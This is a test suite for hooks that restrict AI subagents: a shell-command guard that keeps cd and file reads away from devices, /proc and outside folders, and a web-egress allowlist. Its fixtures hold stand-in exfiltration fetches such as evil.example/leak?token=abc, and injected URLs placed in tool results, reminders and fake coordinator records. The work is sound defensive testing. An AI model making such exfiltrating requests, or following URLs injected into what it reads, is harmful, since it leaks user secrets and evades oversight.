test("researcher guard (cd item 2): cd to the project folder or a folder inside it passes", () => {
  for (const [c, cwd] of /** @type {[string, string][]} */ ([
    // Round 2 (item B): a relative path starts with `./` or `../` (both shells skip CDPATH then); each bare form is a
    // refused neighbour in the next test.
    [`cd ${proj}`, proj], [`cd ${sub}`, proj], [`cd ${sub}/`, proj], ["cd ./sub", proj], ["cd ./sub/deep", proj], ["cd ./sub/", proj],
    ["cd './sub'", proj], ['cd "./sub/deep"', proj], ["cd .", proj], ["cd ./sub/..", proj], ["cd ./link-in", proj], ["cd ./link-in/deep", proj],
    ["cd ./sub/upper", proj], ["cd ./sub && grep -n foo a.txt", proj], ["cd ./sub; ls", proj], ["cd ./sub && cat ../file.txt", proj],
    ["cd ./sub && cd ./deep && ls -la", proj], ["cd ..", sub], ["cd ../sub/deep", sub], [`cd ${proj}`, sub], ["cd ../..", deep],
    ["cd ./sub 2>/dev/null && wc -l ../file.txt", proj], ["cd ./", proj], ["cd ../", sub],
  ])) {
    assert.equal(researcherViolation(c, cwd, proj), null, `${c} (from ${cwd})`);
  }
});

test("researcher guard (cd item 2): every other cd is refused with a message naming the allowed form", () => {
  for (const c of [
    "cd /", "cd /dev", `cd ${home}`, "cd ~", "cd ~/x", "cd", "cd ..", "cd ./link-out", "cd ./link-out/..", "cd ./link-home", "cd ./link-dev",
    "cd ./link-out-rel", "cd ./missing", "cd ./sub deep", "cd -P ./sub", "cd -L ./sub", "cd -", "cd -- ./sub", "cd $HOME", 'cd "$d"', "cd ./su*",
    "cd +1", "cd './sub\n'", "cd $'./sub\\n'", `cd ${outside}`, "cd ./sub/../..", `cd ${proj}/../outside`, "cd ./file.txt",
    `cd ${outside.toUpperCase()}`, `cd ${proj}/link-out/dev`, "cd /tmp", "cd /private/tmp",
    // Round 2 (item B): the bare relative forms, which the shell may resolve through CDPATH, are refused.
    "cd sub", "cd sub/deep", "cd 'sub'", "cd link-in", "cd sub/..", "cd .sub", "cd ..sub",
    // Chains: a later cd is judged from every folder an earlier one may have left the shell in.
    "cd ./sub && cd .. && cd ..", "cd ./sub | cd ../..", "(cd ./sub) && cd ../..", "cd ./sub; cd ../../outside", "cd ./sub && cd ./r",
    "cd ./sub && cd ./dev", "cd ./sub && cd ./deep && cd ../../..", "cd ./sub || cd /", "cd ./sub & cd /dev", "cd ./sub && cd deep",
  ]) {
    const v = researcherViolation(c, proj, proj);
    assert.ok(v, `expected a denial for ${JSON.stringify(c)}`);
    assert.match(v.reason, CD_FORM, c);
    assert.ok(v.reason.split(/\. /).length <= 2 && v.reason.length <= 240, `short: ${v.reason}`);
  }
  // With no project folder known, no cd passes.
  for (const c of ["cd ./sub", "cd .", `cd ${proj}`]) assert.match(researcherViolation(c, proj)?.reason ?? "", CD_FORM, c);
  assert.ok(researcherViolation("cd =sub", proj, proj));
});

test("researcher guard (cd item 2): after an allowed cd, later segments are judged from the folder it reached", () => {
  const rel = posix.relative(deep, "/dev/zero");
  const relDev = posix.relative(deep, "/dev");
  for (const c of [
    `cd ./sub/deep && cat ${rel}`, `cd ./sub/deep && grep -f${rel} x`, `cd ./sub/deep && grep -rf${rel} x`, `cd ./sub/deep && grep --file=${rel} x`,
    `cd ./sub/deep && head -c8${rel}`, `cd ./sub/deep && wc -l ${rel}`, `cd ./sub/deep && grep -r x ${relDev}`,
    // Each of these names a device only from the folder the cd reached.
    "cd ./sub && cat r/../dev/zero", "cd ./sub && cat dev/zero", "cd ./sub && grep -fdev/zero x", "cd ./sub && grep -rfdev/zero x",
    "cd ./sub && grep --file=dev/urandom x", "cd ./sub && grep -r x dev", "cd ./sub && grep -r x dev/", "cd ./sub; cd ./deep; cat ../r/../dev/zero",
    "cd ./sub && cd ./deep && wc -c ../dev/zero", "(cd ./sub) ; cat dev/zero", "cd ./sub | cat dev/zero", "cd ./link-in && cat dev/zero",
    "cd ./sub && sed -n 1p dev/zero", "cd ./sub && cut -f1 dev/zero", "cd ./sub && tail -n5 'dev/zero'", "cd ./sub/ && cat d\\ev/zero",
  ]) {
    const v = researcherViolation(c, proj, proj);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  // Ordinary reads after a cd still pass.
  for (const c of ["cd ./sub && cat ../file.txt", "cd ./sub && grep -rn foo .", "cd ./sub/deep && ls ../.. && wc -l ../../file.txt"]) {
    assert.equal(researcherViolation(c, proj, proj), null, c);
  }
});

// fix-guards-2 item 2: the walk returned "missing" at the first name that did not exist, before it looked at whether it
// had passed through /dev, so a file descriptor the hook lacks but the command's shell may have (`/dev/fd/63`, a
// process substitution's) passed through a link to /dev.
test("researcher guard (guards-2 item 2): a path through /dev is refused when its last part is missing; /dev/null still passes", () => {
  const fdProj = join(scratch, "fd-missing", "proj");
  mkdirSync(join(fdProj, "sub"), { recursive: true });
  writeFileSync(join(fdProj, "file.txt"), "x\n");
  const ld = join(fdProj, "ld");
  if (!existsSync(ld)) symlinkSync("/dev", ld);
  // A descriptor number this process does not hold, so the last part is missing here.
  const fd = [63, 99, 987, 4093].find((n) => !existsSync(`/dev/fd/${n}`));
  assert.ok(fd, "a free descriptor number");
  for (const c of [
    `cd ./sub && grep -rn x ../ld/fd/${fd}`, `cd ./sub && cat ../ld/fd/${fd}`, `grep -rn x ${ld}/fd/${fd}`, `cat ./ld/fd/${fd}`,
    `grep -f./ld/fd/${fd} x .`, `cat ./ld/no-such-device`, `cat /dev/fd/${fd}`, `cat ./ld/null/x`,
  ]) {
    const v = researcherViolation(c, fdProj, fdProj);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  // /dev/null through the link, and a missing path that never touches /dev, pass as before.
  for (const c of ["cd ./sub && cat ../ld/null", `cat ${ld}/null`, "cat ./ld/null", "grep --file=./ld/null x .", "cd ./sub && cat ../no-such-file", "cat ./missing/deeper.txt", "cat ./file.txt/x"]) {
    assert.equal(researcherViolation(c, fdProj, fdProj), null, c);
  }
});

test("researcher guard hook (cd item 2): the project folder comes from the hook, the folder from the payload", () => {
  const pay = (/** @type {string} */ command, /** @type {string} */ cwd) => ({ ...bash(command), cwd });
  const extra = { CLAUDE_PROJECT_DIR: proj, HOME: home };
  for (const [c, cwd, code] of /** @type {[string, string, number][]} */ ([
    ["cd ./deep", sub, 0], ["cd ..", sub, 0], ["cd ./sub && cat ../file.txt", proj, 0], ["cat dev/zero", sub, 2], ["cat r/../dev/zero", sub, 2],
    ["cd ..", proj, 2], [`cd ${home}`, proj, 2], ["cd ~", proj, 2], ["cd", proj, 2], [`cd ${outside}`, sub, 2], ["cd ./sub && cat dev/zero", proj, 2],
    ["cd deep", sub, 2], ["cd sub", proj, 2],
  ])) {
    const r = run(RESEARCHER, pay(c, cwd), extra);
    assert.equal(r.code, code, `${c} (from ${cwd}): ${r.stderr}`);
    assert.equal(r.stdout, "");
    if (code === 2 && c.startsWith("cd") && !c.includes("cat")) assert.match(r.stderr, /`cd` is allowed only as `cd <path>`/, c);
    if (code === 0) assert.equal(r.stderr, "");
  }
});

// fix-researcher-cd item 3: the guard decides for any input and the hook exits 0 or 2, never anything else.
test("researcher guard (cd item 3): odd paths, long words, symlink chains and loops get a decision, quickly", () => {
  const links = join(scratch, "odd-links");
  mkdirSync(links, { recursive: true });
  if (!existsSync(join(links, "l0"))) {
    symlinkSync("/", join(links, "l0"));
    for (let i = 1; i < 60; i++) symlinkSync(join(links, `l${i - 1}`), join(links, `l${i}`));
    symlinkSync(join(links, "loopB"), join(links, "loopA"));
    symlinkSync(join(links, "loopA"), join(links, "loopB"));
  }
  // A long word first: judged suffix by suffix it took seconds (and a word of a few hundred thousand characters, minutes).
  const t1 = Date.now();
  assert.ok(researcherViolation(`grep -${"r".repeat(100000)} x`, proj, proj), "a word too long to judge is refused");
  assert.ok(Date.now() - t1 < 3000, "a long word is judged quickly");
  const odd = [
    `cat ${"a/".repeat(5000)}`, `cat /${"x".repeat(300000)}`, `grep -${"r".repeat(100000)} x`, `cat ${"../".repeat(3000)}dev/zero`,
    "cat a\u0000b", "cat 'a\u0000b'", "cat $'\\x00'", "cat \u0001\u0002\u007f", "cat '\n'", "cat \udc00", "cat \ud800x",
    "cat /dev/fd/0", "cat /dev/fd/", "cat /dev/stdin", "cat /dev/tty", "grep -r x /dev/fd", `cat ${links}/l30/dev/zero`,
    `cat ${links}/l59/dev/zero`, `cat ${links}/loopA`, `cat ${links}/loopA/../dev/zero`, `cd ${links}/loopA`, `cd ${links}/l59`,
    `cd ${"a/".repeat(5000)}`, `cd /${"x".repeat(300000)}`, "cd /dev/fd/0", "cd /dev/stdin", "cd $'\\x01'", "cd \udc00",
    `${"cd sub; ".repeat(200)}cat dev/zero`, `${"cd sub && cd .. && ".repeat(100)}ls`,
  ];
  const cwds = [proj, "/", "/dev", "/dev/fd/0", "relative", "", `/${"y".repeat(5000)}`, "/a\u0000b", "/dev/zero"];
  const projects = [proj, undefined, "", "relative", "/dev/zero", "/a\u0000b", `/${"z".repeat(5000)}`, `${links}/loopA`];
  for (const c of odd) {
    for (const cwd of cwds) {
      for (const p of projects) {
        const t0 = Date.now();
        /** @type {unknown} */
        let v;
        assert.doesNotThrow(() => {
          v = researcherViolation(c, cwd, p);
        }, `${JSON.stringify(c.slice(0, 40))} ${JSON.stringify(cwd.slice(0, 20))} ${String(p).slice(0, 20)}`);
        assert.ok(v === null || (typeof v === "object" && typeof (/** @type {any} */ (v).reason) === "string"));
        assert.ok(Date.now() - t0 < 3000, `slow: ${c.slice(0, 40)}`);
      }
    }
  }
  // Each of these is refused wherever it runs: a word too long to judge, a device, a cd that cannot be judged.
  for (const c of [`grep -${"r".repeat(100000)} x`, `cat /${"x".repeat(300000)}`, "cat /dev/fd/0", "cat /dev/stdin", `cd ${links}/loopA`, `cd ${"a/".repeat(5000)}`, `${"cd sub; ".repeat(200)}cat dev/zero`]) {
    assert.ok(researcherViolation(c, proj, proj), c.slice(0, 40));
  }
  // Wherever the system can open a device through a chain of links (one byte read, nothing more), the guard refuses it;
  // a chain too long for the system (ELOOP) reaches nothing.
  let opened = 0;
  for (let i = 0; i < 60; i += 3) {
    const p = `${links}/l${i}/dev/zero`;
    try {
      const fd = openSync(p, "r");
      readSync(fd, Buffer.alloc(1), 0, 1, null);
      closeSync(fd);
      opened++;
    } catch {
      continue;
    }
    assert.ok(researcherViolation(`cat ${p}`, proj, proj), p);
  }
  assert.ok(opened > 0);
});

test("researcher guard (cd item 3): importing the guard never runs the hook, and a second copy decides the same", async () => {
  // A script whose own name ends in researcher-guard.mjs used to run the hook block when it imported the guard, and the
  // block ended that process mid-import.
  const probeDir = join(scratch, "probe");
  mkdirSync(probeDir, { recursive: true });
  const probe = join(probeDir, "probe-researcher-guard.mjs");
  const url = (/** @type {string} */ q) => JSON.stringify(`${new URL("../.claude/hooks/researcher-guard.mjs", import.meta.url).href}${q}`);
  writeFileSync(probe, `const a = await import(${url("")});\nconst b = await import(${url("?copy=2")});\nconsole.log("imported", a.researcherViolation("cat /dev/zero") !== null, b.researcherViolation("cat /dev/zero") !== null);\n`);
  for (const input of ["", JSON.stringify(bash("cat /dev/zero")), JSON.stringify(bash("ls"))]) {
    const r = spawnSync(process.execPath, [probe], { input, env: env(), cwd: probeDir, encoding: "utf8" });
    assert.deepEqual([r.status, r.signal, r.stdout.trim()], [0, null, "imported true true"], `${input}: ${r.stderr}`);
  }
  const copy = await import(`${new URL("../.claude/hooks/researcher-guard.mjs", import.meta.url).href}?copy=${Date.now()}`);
  for (const c of ["cat /dev/zero", "cd sub", "grep -r x /dev", "cat dev/zero"]) {
    assert.deepEqual(copy.researcherViolation(c, sub, proj), researcherViolation(c, sub, proj), c);
  }
  // Run through a symlinked path, the hook still decides.
  const linked = join(probeDir, "linked-researcher-guard.mjs");
  if (!existsSync(linked)) symlinkSync(RESEARCHER, linked);
  assert.equal(run(linked, bash("cat /dev/zero")).code, 2);
});

test("researcher guard hook (cd item 3): odd payloads exit 0 or 2, never anything else", () => {
  const cmds = ["cat /dev/zero", "cd /", "cd sub", `cat ${"a/".repeat(3000)}`, `grep -${"r".repeat(20000)} x`, "cat /dev/fd/0"];
  const cwds = [undefined, "/", "/dev/fd/0", "relative", `/${"x".repeat(5000)}`, "/a\u0000b", 5, proj];
  for (const command of cmds) {
    for (const cwd of cwds) {
      for (const p of [proj, "", "/dev/zero"]) {
        const r = run(RESEARCHER, { ...bash(command), cwd }, { CLAUDE_PROJECT_DIR: p, HOME: home });
        assert.ok(r.code === 0 || r.code === 2, `${r.code} ${command.slice(0, 30)} ${String(cwd).slice(0, 20)} ${p}: ${r.stderr}`);
        assert.equal(r.stdout, "");
      }
    }
  }
});

// w3 item 1: a glob is judged on what it can expand to, a FIFO, socket or device operand is refused, and /proc and /sys
// are refused like /dev (their files can wait for ever, and /proc/self is the guard's own process, not the shell's).
const w3 = join(scratch, "w3-glob");
mkdirSync(join(w3, "docs"), { recursive: true });
for (const f of ["a.txt", "b.txt", "docs/c.md"]) writeFileSync(join(w3, f), "x\n");
symlinkSync("/dev", join(w3, "devlink"));
symlinkSync("/", join(w3, "rootlink"));
const hasFifo = spawnSync("mkfifo", [join(w3, "pipe")]).status === 0;

test("researcher guard (w3 item 1): a glob that can expand to a device path is refused", () => {
  for (const c of [
    "cat /de?/zero",
    "cat /d*/zero",
    "head -c 8 /[d]ev/urandom",
    "wc -c /*/zero",
    "grep --file=/de?/zero x",
    "tail -c 8 devl?nk/zero", // through a symlinked folder
    "cat rootl?nk/../dev/zero", // through a symlink to / and ..
    "cat rootlink/../de?/zero",
    "cut -f1 ./../w3-glob/devl*/zero",
  ]) {
    const v = researcherViolation(c, w3);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  assert.ok(researcherViolation("sed -n 1p /d?v/zero", w3), "sed takes no glob operand at all");
  // /dev/null reached by a glob, ordinary globs, and commands that never read their operands still pass.
  // w3 second attempt: a walk that meets a symlink to /dev but matches nothing past it is not refused.
  assert.equal(researcherViolation("grep -n x */*.md", w3), null);
  for (const c of ["cat /de?/null", "wc -l *.txt docs/*.md", "head -n 1 ?.txt", "cat [ab].txt", "grep -n x docs/*.md", "ls /de?/*", "du -sh /*", "stat /de?/zero", "find /d* -maxdepth 0"]) {
    assert.equal(researcherViolation(c, w3), null, c);
  }
});

test("researcher guard (w3 item 1): a FIFO operand, also behind a glob, is refused; listing it is not", { skip: hasFifo ? false : "mkfifo unavailable" }, () => {
  for (const c of ["cat pipe", "head -n 1 pip?", "grep x p*", "wc -l ./*", "tail -n 1 [p]ipe", "cut -f1 pipe", "grep -f pipe x a.txt", "rg --file=pip* x ."]) {
    const v = researcherViolation(c, w3);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  for (const c of ["ls -la pipe", "stat pipe", "find . -name pipe", "ls p*", "du -a ."]) assert.equal(researcherViolation(c, w3), null, c);
});

test("researcher guard (w3 item 1): /proc and /sys are refused like /dev, in every spelling", () => {
  for (const c of ["cat /proc/self/fd/0", "head /proc/kmsg", "cat /sys/kernel/notes", "cat /pro?/self/environ", "cat //proc/../proc/cpuinfo", "cat rootlink/../proc/self/fd/0", "grep x /proc", "wc -l /PROC/x"]) {
    const v = researcherViolation(c, w3);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  for (const c of ["cat ../notes/proc.md", "grep -rn proc docs", "ls /proc", "stat /sys"]) assert.equal(researcherViolation(c, w3), null, c);
});

test("researcher guard (w3 item 1): du --files0-from and find -files0-from read their file and are judged", () => {
  for (const c of ["du --files0-from=/dev/zero", "du --files0-from /dev/zero", "du --files0=/dev/zero", "find -files0-from /dev/zero", "du --files0-from=/de?/zero"]) {
    const v = researcherViolation(c, w3);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  assert.equal(researcherViolation("du --files0-from=a.txt", w3), null);
});

// w3 follow-up: the shell reading lists what bash 4.3+ and zsh list (no dot names, `**` not through a symlinked
// folder) and judges every match; only the listing bound refuses for size. The wide reading still refuses a pattern
// that reaches a device, FIFO, /dev, /proc or /sys under dotglob, globstar off or zsh `***`.
const shaped = join(scratch, "w3-shaped");
for (const d of ["docs", "src", "node_modules/pkg", ".claude/worktrees/x"]) mkdirSync(join(shaped, d), { recursive: true });
for (const f of ["docs/a.md", "docs/b.md", "src/a.ts", "src/a.test.mjs", "src/b.test.ts", "README.md"]) writeFileSync(join(shaped, f), "x\n");
for (let i = 0; i < 1500; i++) {
  writeFileSync(join(shaped, "node_modules", "pkg", `n${i}.md`), "");
  writeFileSync(join(shaped, ".claude", "worktrees", "x", `w${i}.md`), "");
}
symlinkSync(join(shaped, "node_modules"), join(shaped, "linked"));

test("researcher guard (w3 follow-up): everyday globs in a tree shaped like this repository pass", () => {
  for (const c of ["rg x **/*.md", "ls src/*.test.*", "cat docs/*.md", "head -5 src/*.ts", "wc -l **/*.md", "grep -n x */*.md"]) {
    assert.equal(researcherViolation(c, shaped), null, c);
  }
  // Over the old cap of 500 matches: judged, not refused for size.
  assert.equal(researcherViolation("wc -l node_modules/pkg/*.md", shaped), null);
});

test("researcher guard (w3 follow-up): a pattern that reaches /dev, a FIFO, or a device only under dotglob is still refused", () => {
  const dot = join(scratch, "w3-dotglob");
  mkdirSync(join(dot, "plain"), { recursive: true });
  symlinkSync("/dev", join(dot, ".hid"));
  for (const c of ["cat */zero", "cat **/zero", "head -c 8 ?hid/zero", "cat .h*/zero"]) {
    const v = researcherViolation(c, dot);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  for (const c of ["cat /dev/*", "cat /d?v/null*", "cat /de?/n*"]) {
    const v = researcherViolation(c, shaped);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  if (hasFifo) {
    for (const c of ["head -n 1 pip?", "wc -l ./*", "cat **/pipe"]) assert.ok(researcherViolation(c, w3), c);
  }
});

test("researcher guard (w3 follow-up): only a glob that lists more names than the bound is refused for size, saying how to avoid it", () => {
  const big = join(scratch, "w3-big");
  mkdirSync(big, { recursive: true });
  for (let i = 0; i < 20001; i++) writeFileSync(join(big, `f${i}.txt`), "");
  const v = researcherViolation("cat *.txt", big);
  assert.ok(v);
  assert.match(v.reason, /too wide to judge/);
  assert.match(v.reason, /quote the glob so the command expands it itself/);
  assert.match(v.reason, /name a folder/);
  assert.equal(researcherViolation("rg x -g '*.txt'", big), null);
  assert.equal(researcherViolation("cat f1.txt f2.txt", big), null);
  assert.ok(researcherViolation("wc -l f1?.txt", big), "the bound counts the names listed, not the matches");
});

test("researcher guard hook: exit 2 with the allowed prefixes for the session-6.5 cases, exit 0 silently for allowed", () => {
  for (const c of ["cat > x.py <<EOF\nprint(1)\nEOF", "python3 x.py", "cd src && ls"]) {
    for (const t of ["researcher", "orchestration:researcher"]) {
      const r = run(RESEARCHER, bash(c, t));
      assert.equal(r.code, 2, c);
      assert.match(r.stderr, /git log, git ls-files.*wc, ls, du/);
      assert.equal(r.stdout, "");
    }
  }
  const ok = run(RESEARCHER, bash("git log --oneline | wc -l"));
  assert.deepEqual([ok.code, ok.stdout, ok.stderr], [0, "", ""]);
  const gates = readFileSync(join(stateDir, "gates.jsonl"), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)).filter((g) => g.gate === "researcher");
  assert.ok(gates.length >= 6);
  for (const g of gates) {
    assert.deepEqual(Object.keys(g).sort(), ["agent_id", "decision", "gate", "reason", "session_id", "ts", "word"]);
    assert.doesNotMatch(JSON.stringify(g), /print\(1\)|x\.py/); // C7: never the command text
  }
});

test("researcher guard hook: other agent types, the main thread, ORCH_GUARDS=off and malformed input pass untouched", () => {
  for (const t of ["implementer", "reviewer", "orchestration:implementer", null]) {
    const r = run(RESEARCHER, bash("python3 x.py", t));
    assert.deepEqual([r.code, r.stdout], [0, ""], String(t));
  }
  const off = run(RESEARCHER, bash("python3 x.py"), { ORCH_GUARDS: "off" });
  assert.deepEqual([off.code, off.stdout, off.stderr], [0, "", ""]);
  for (const bad of ["", "not json", "null", "[]", JSON.stringify({ agent_type: "researcher", tool_input: {} }), JSON.stringify({ agent_type: "researcher", tool_name: "Read", tool_input: { command: "python3" } })]) {
    const r = run(RESEARCHER, bad);
    assert.deepEqual([r.code, r.stdout], [0, ""], bad);
  }
});

// ---- egress guard ----

const transcripts = join(scratch, "transcripts");
const SID = "sess-egress";
const mainTranscript = join(transcripts, `${SID}.jsonl`);
mkdirSync(join(transcripts, SID, "subagents", "workflows", "wf_1"), { recursive: true });
writeFileSync(mainTranscript, `${JSON.stringify({ type: "user", isSidechain: false, message: { role: "user", content: "see https://main-only.example/x" } })}\n`);
const userLine = (/** @type {string} */ content, /** @type {string} */ agentId) => `${JSON.stringify({ parentUuid: null, isSidechain: true, agentId, type: "user", message: { role: "user", content } })}\n`;
// Foreground (or background) Agent tool reviewer: the brief is its first user message, verbatim.
writeFileSync(
  join(transcripts, SID, "subagents", "agent-afg1.jsonl"),
  userLine("SLICE: s1\nCHECKS: C1\nC1: the doc cites https://www.Cited.example/spec.\nReview the change.", "afg1") +
    `${JSON.stringify({ type: "assistant", message: { content: "fetching https://evil.example" } })}\n`,
);
// Workflow agent(): the harness wraps the brief and indents every line.
writeFileSync(
  join(transcripts, SID, "subagents", "workflows", "wf_1", "agent-awf1.jsonl"),
  userLine("[Workflow harness — computed task] The task text below was computed at runtime by a workflow script. The computed task text follows:\n  SLICE: s2\n  Check https://wf.example/page against the code.", "awf1"),
);
// A reviewer of slice s1 whose brief names no URL: the planned files of s1 give the hosts.
writeFileSync(join(transcripts, SID, "subagents", "agent-afg2.jsonl"), userLine("SLICE: s1\nReview the change.", "afg2"));
mkdirSync(join(project, "docs"), { recursive: true });
writeFileSync(join(project, "docs", "links.md"), "Sources: https://files.example/ref and (https://www.second.example/a).\n");
const plan = "PLAN REVIEW\nCONSTRAINTS:\nC1: cite sources\nSLICE: s1\nFILES: docs/links.md, docs/missing.md\nDEPENDS: none\nGOAL: docs\n";
writeFileSync(join(stateDir, "journal-launches.jsonl"), `${JSON.stringify(launchRecord({ subagent_type: "reviewer", prompt: plan }, { sessionId: SID, agentId: "aplan" }))}\n`);

const fetchInput = (/** @type {string} */ url, /** @type {string} */ agentId, /** @type {string} */ agentType = "reviewer") => ({
  session_id: SID, transcript_path: mainTranscript, cwd: project, agent_id: agentId, agent_type: agentType, hook_event_name: "PreToolUse", tool_name: "WebFetch", tool_input: { url, prompt: "summarize" },
});

test("egress guard: transcript location for foreground and workflow agents", () => {
  assert.equal(agentTranscript(mainTranscript, "afg1"), join(transcripts, SID, "subagents", "agent-afg1.jsonl"));
  assert.equal(agentTranscript(mainTranscript, "awf1"), join(transcripts, SID, "subagents", "workflows", "wf_1", "agent-awf1.jsonl"));
  assert.equal(agentTranscript(mainTranscript, "nope"), null);
  assert.equal(agentTranscript(mainTranscript, "../x"), null);
  assert.equal(hostOf("https://WWW.Example.COM/a"), "example.com");
  assert.equal(hostOf("not a url"), null);
});

test("egress guard: the port counts, the scheme's default port is normalised (b4)", () => {
  assert.equal(hostOf("https://a.example:443/x"), hostOf("https://a.example/"));
  assert.equal(hostOf("http://a.example:80/x"), hostOf("http://a.example/"));
  assert.notEqual(hostOf("https://a.example:8443/x"), hostOf("https://a.example/"));
  assert.equal(hostOf("https://WWW.A.example:8443/x"), "a.example:8443");
  const allowed = allowedHosts("see https://cited.example and http://alt.example:8080/doc", [], project);
  assert.ok(allowed.has(String(hostOf("https://cited.example:443/z"))));
  assert.ok(!allowed.has(String(hostOf("https://cited.example:8443/z"))));
  assert.ok(allowed.has(String(hostOf("http://alt.example:8080/other"))));
  assert.ok(!allowed.has(String(hostOf("http://alt.example/other"))));
  const o = { dir: stateDir, env: env() };
  assert.equal(egressDecision(fetchInput("https://cited.example:8443/x", "afg1"), o).decision, "deny");
  assert.equal(egressDecision(fetchInput("https://cited.example:443/x", "afg1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://files.example:444/x", "afg1"), o).decision, "deny");
});

test("egress guard: hosts from the brief allow, others deny (foreground reviewer)", () => {
  const o = { dir: stateDir, env: env() };
  assert.equal(egressDecision(fetchInput("https://cited.example/other/page", "afg1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://www.cited.example/spec", "afg1"), o).decision, "allow");
  // s1's planned files name files.example and second.example
  assert.equal(egressDecision(fetchInput("https://files.example/x", "afg1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://second.example/x", "afg2"), o).decision, "allow");
  const d = egressDecision(fetchInput("https://evil.example/?q=secret", "afg1"), o);
  assert.equal(d.decision, "deny");
  assert.match(String(d.reason), /evil\.example/);
  assert.doesNotMatch(String(d.reason), /secret/);
  // a URL only in the main transcript or the agent's later messages does not count
  assert.equal(egressDecision(fetchInput("https://main-only.example/x", "afg1"), o).decision, "deny");
  assert.equal(egressDecision(fetchInput("https://cited.example.evil.example/", "afg1"), o).decision, "deny");
});

test("egress guard: workflow-style reviewer brief, unverified brief, other agents", () => {
  const o = { dir: stateDir, env: env() };
  assert.equal(egressDecision(fetchInput("https://wf.example/other", "awf1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://files.example/x", "awf1"), o).decision, "deny"); // s2 is not planned
  assert.equal(egressDecision(fetchInput("https://any.example/", "agone"), o).decision, "unverified");
  assert.equal(egressDecision(fetchInput("https://any.example/", "afg1", "researcher"), o).decision, "skip");
  assert.equal(egressDecision(fetchInput("https://any.example/", "afg1"), { dir: stateDir, env: env({ ORCH_GUARDS: "off" }) }).decision, "skip");
});

// A reviewer resumed by a message (SendMessage). Shape copied from real subagent transcripts (Claude Code 2.1.3xx): the
// coordinator's message is a user record with isMeta true, origin {kind: "coordinator"} and string content. Every other
// later user record (tool results, fetched pages, system reminders, skill bodies, task notifications, hook feedback)
// must never widen the allowlist.
const later = (/** @type {Record<string, unknown>} */ rec) => `${JSON.stringify({ isSidechain: true, agentId: "ares1", type: "user", ...rec })}\n`;
writeFileSync(
  join(transcripts, SID, "subagents", "agent-ares1.jsonl"),
  userLine("SLICE: s9\nReview the change against https://first.example/spec.", "ares1") +
    `${JSON.stringify({ type: "assistant", message: { content: [{ type: "tool_use", id: "t1", name: "WebFetch", input: { url: "https://first.example/spec" } }] } })}\n` +
    later({ message: { role: "user", content: [{ type: "tool_result", tool_use_id: "t1", content: "Also see https://toolresult.example/x" }] } }) +
    later({ message: { role: "user", content: [{ type: "tool_result", tool_use_id: "t2", content: [{ type: "text", text: "page text https://fetched.example/y" }] }] } }) +
    later({ isMeta: true, message: { role: "user", content: "<system-reminder>\nsee https://reminder.example/z\n</system-reminder>" } }) +
    later({ isMeta: true, message: { role: "user", content: [{ type: "text", text: "Base directory for this skill: /x\nDocs at https://skill.example/doc" }] } }) +
    later({ isMeta: true, origin: { kind: "task-notification", producer: "session-task" }, message: { role: "user", content: "[SYSTEM NOTIFICATION - NOT USER INPUT]\noutput https://notify.example/n" } }) +
    later({ isMeta: true, message: { role: "user", content: "Stop hook feedback:\nhttps://hookfeedback.example/h" } }) +
    later({ message: { role: "user", content: [{ type: "text", text: "Plain later text: https://plain.example/t" }] } }) +
    later({ message: { role: "user", content: "Plain later string: https://plainstr.example/t" } }) +
    later({ isCompactSummary: true, isVisibleInTranscriptOnly: true, message: { role: "user", content: "This session is being continued. Summary: fetched https://compact.example/collect" } }) +
    later({ isVisibleInTranscriptOnly: true, message: { role: "user", content: "shown only: https://visible.example/v" } }) +
    later({ isSidechain: true, message: { role: "user", content: "sidechain text: https://sidechain.example/s" } }) +
    later({ isMeta: true, origin: { kind: "coordinator" }, isCompactSummary: true, message: { role: "user", content: "summary dressed as coordinator https://dressed.example/d" } }) +
    later({ isMeta: true, origin: { kind: "coordinator" }, message: { role: "user", content: [{ type: "text", text: "coordinator with parts https://parts.example/p" }] } }) +
    later({ isMeta: true, origin: { kind: "coordinator" }, message: { role: "user", content: "The coordinator sent a message while you were working:\nSLICE: s9\nAlso check https://resumed.example/new-spec." } }),
);

test("egress guard: a reviewer resumed by a message may fetch the URL that message names, and nothing else that came later", () => {
  const o = { dir: stateDir, env: env() };
  assert.equal(egressDecision(fetchInput("https://first.example/a", "ares1"), o).decision, "allow");
  assert.equal(egressDecision(fetchInput("https://resumed.example/new-spec", "ares1"), o).decision, "allow");
  // An allowlist of one shape: plain later records, compaction summaries (written by the agent's model from all it
  // read), transcript-only records and anything but a coordinator message with string content are refused.
  for (const h of ["toolresult", "fetched", "reminder", "skill", "notify", "hookfeedback", "plain", "plainstr", "compact", "visible", "sidechain", "dressed", "parts"]) {
    assert.equal(egressDecision(fetchInput(`https://${h}.example/x`, "ares1"), o).decision, "deny", h);
  }
});

test("egress guard hook: exit codes, gates.jsonl holds the host only, no decisions printed", () => {
  const allow = run(EGRESS, fetchInput("https://cited.example/x?token=abc", "afg1"));
  assert.deepEqual([allow.code, allow.stdout, allow.stderr], [0, "", ""]);
  const deny = run(EGRESS, fetchInput("https://evil.example/leak?token=abc", "afg1"));
  assert.equal(deny.code, 2);
  assert.match(deny.stderr, /evil\.example/);
  assert.equal(deny.stdout, "");
  const unv = run(EGRESS, fetchInput("https://any.example/p?token=abc", "agone"));
  assert.deepEqual([unv.code, unv.stdout], [0, ""]);
  const wf = run(EGRESS, fetchInput("https://www.wf.example/x", "awf1", "orchestration:reviewer"));
  assert.deepEqual([wf.code, wf.stdout], [0, ""]);
  const off = run(EGRESS, fetchInput("https://evil.example/", "afg1"), { ORCH_GUARDS: "off" });
  assert.deepEqual([off.code, off.stdout, off.stderr], [0, "", ""]);
